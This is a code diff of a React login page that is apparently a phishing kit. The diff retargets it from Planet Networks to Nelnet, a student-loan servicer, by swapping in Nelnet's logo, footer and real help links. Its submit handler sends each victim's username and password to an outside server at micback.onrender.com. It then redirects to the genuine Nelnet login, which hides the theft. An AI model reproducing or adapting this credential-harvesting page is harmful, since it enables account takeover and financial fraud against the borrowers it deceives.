@@ -10,6 +10,8 @@ import google from './google.png';
 import rounde from './round.png';
 import aptlogo from './apt_logo.png';
 import planet from './planet.png';
+import nelnet from './nelnet.svg';
+import access from './access.png';
 
 
 
@@ -19,18 +21,19 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Planet")
+    const[platform, setPlatform] = useState("nelnet")
 
     const[showError, setShowError] = useState(false);
 
     const[ischecked, setChecked] = useState(false);
+    const[showPassword, setShowPassword] = useState(false);
 
 
 async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
+        const response = await axios.post('https://micback.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -42,7 +45,7 @@ async function handleSubmit(e){
         if(response.status == 200){
             console.log(response.data.message);
 
-            window.location.href = 'https://fibersmith-planetnetworks.us.auth0.com/login?state=hKFo2SBlTzBYeFQ1N2lLNUZ4c1dGZ3M3SG9mdXlHQ2FvUVhBRqFupWxvZ2luo3RpZNkgN2xLNF9LcDV2V25CYVloMEV4elU0STNVSlhLc3BwWDWjY2lk2SB4R2FUWUsybUtaQVhsVVd1UU9QRDRoY0dWUTF5VUpiVw&client=xGaTYK2mKZAXlUWuQOPD4hcGVQ1yUJbW&protocol=oauth2&response_type=token%20id_token&redirect_uri=https%3A%2F%2Fmy.planet.net%2Fcallback&scope=openid%20profile%20token%20token_id&audience=https%3A%2F%2Fplanetnetworksportalapi.fibersmith.systems%2F&nonce=AKpL3AS8.AYERmXfcgFUV44fd_Bf80wi&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4yMy4zIn0%3D';
+            window.location.href = 'https://auth.nelnet.com/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_type%3Dcode%26client_id%3Dmma%26state%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96semicolon%25252Fdashboard%26redirect_uri%3Dhttps%253A%252F%252Fsecure.nelnet.com%26scope%3Dopenid%2520offline_access%2520mma.api.read%2520mma.api.write%26code_challenge%3DrBGHOu1mH2Ol4dy6tCOUfJpd2g4oqZ9n6zbc8PmJXqE%26code_challenge_method%3DS256%26nonce%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96%26nds_client_id%3D1%26nds_application_id%3D1%26pid%3D_PENDO_T_vHYTKtaYEKy';
         }
       } catch (error) {
         // Handle error
@@ -64,11 +67,18 @@ async function handleSubmit(e){
             </div>}
         </div>
 
+        <nav className='mynav py-2 container'>
+            <img className='mylogo' src={nelnet} />
+        </nav>
 
+        <div className='greydiv'>
 
-            <div className='col-md-3 whitediv m-auto'>
+        </div>
+
+<div className='row py-2 container '>
+<div className='col-md-4 whitediv '>
                 <div className='imagediv py-4 px-0 text-center'>
-                <img className='logoimage' src={planet} />
+                <img className='logoimage' src={access} />
 
                 </div>
 
@@ -85,39 +95,64 @@ async function handleSubmit(e){
     </div>
     <input onChange={function(e){
       setUserName(e.target.value);
-    }}value={email} type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="username/email"required/>
+    }}value={email} type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="Username"required/>
   </div>
 
 
 
   <div class="input-group  px-3 mt-2">
-    <div class="input-group-prepend mt-2">
-      <div class="input-group-text"><i className='fa fa-lock icons'></i></div>
-    </div>
+    
     <input onChange={function(e){
       setPassword(e.target.value);
-    }}value={password} type="password" class="form-control" id="inlineFormInputGroupUsername2" placeholder="your password"required/>
+    }}value={password} type={showPassword ? "text" : "password"} class="form-control" id="inlineFormInputGroupUsername2" placeholder="Password"required/>
+  <div class="input-group-prepend mt-2">
+      <div class="input-group-text"><i onClick={function(e){
+                        e.preventDefault();
+                        setShowPassword(!showPassword);
+                    }} className='fa fa-eye icons'></i></div>
+    </div>
   </div>
 
 
-<div className='text-center py-4'>
-<a className='forgot'>Don't remember your password?</a>
+<div className='py-4'>
+<input className='check'type="checkbox" /><a className='pl-4 save'>Save Username</a>
 
 </div>
     
        
                    
-                 <div className='form-group text-center'>
+                 <div className='form-group'>
 
-                        <button type='submit' className='btn btn-rounded-bottom mybutton '>{'LOG IN >'}</button>
+                        <button type='submit' className='btn mybutton '>{'Continue'}</button>
 
                     </div>
 
                 </form>
 
+                <div>
+          <h4 className='trouble '>Trouble Logging In?</h4>
+
+                  
+        </div>
+
             </div>
 
+        
 
+</div>
+
+<div className='footerdiv m-0'>
+<a href='https://auth.nelnet.com/Account/ForgotUsername?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_type%3Dcode%26client_id%3Dmma%26state%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96semicolon%25252Fdashboard%26redirect_uri%3Dhttps%253A%252F%252Fsecure.nelnet.com%26scope%3Dopenid%2520offline_access%2520mma.api.read%2520mma.api.write%26code_challenge%3DrBGHOu1mH2Ol4dy6tCOUfJpd2g4oqZ9n6zbc8PmJXqE%26code_challenge_method%3DS256%26nonce%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96%26nds_client_id%3D1%26nds_application_id%3D1%26pid%3D_PENDO_T_vHYTKtaYEKy&clientId=1&appId=1' className='mx-1 footer'>Forgot Username ?</a> | <a href='https://auth.nelnet.com/Account/ForgotPassword?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_type%3Dcode%26client_id%3Dmma%26state%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96semicolon%25252Fdashboard%26redirect_uri%3Dhttps%253A%252F%252Fsecure.nelnet.com%26scope%3Dopenid%2520offline_access%2520mma.api.read%2520mma.api.write%26code_challenge%3DrBGHOu1mH2Ol4dy6tCOUfJpd2g4oqZ9n6zbc8PmJXqE%26code_challenge_method%3DS256%26nonce%3Da19PMjBIZEFFbC5SbUIuNDNuNXdJX29NTXZaU2lZeH5TS0l1d0pjRXFySU96%26nds_client_id%3D1%26nds_application_id%3D1%26pid%3D_PENDO_T_vHYTKtaYEKy&clientId=1&appId=1' className='mx-1 footer'>Forgot Password ?</a> | <a className='footer'>Get help logging in</a>
+</div>
+
+            
+
+<div className='greydivtwo'>
+
+  <p className='small'>© 2024 Nelnet, Inc. and Affiliates. All Rights Reserved.</p>
+  <a className='foota'>Terms and Conditions</a> | <a className='foota'>Privacy Policy</a> <a className='foota'>Version: 1.0.1.396</a>
+
+        </div>
           
         
         </>
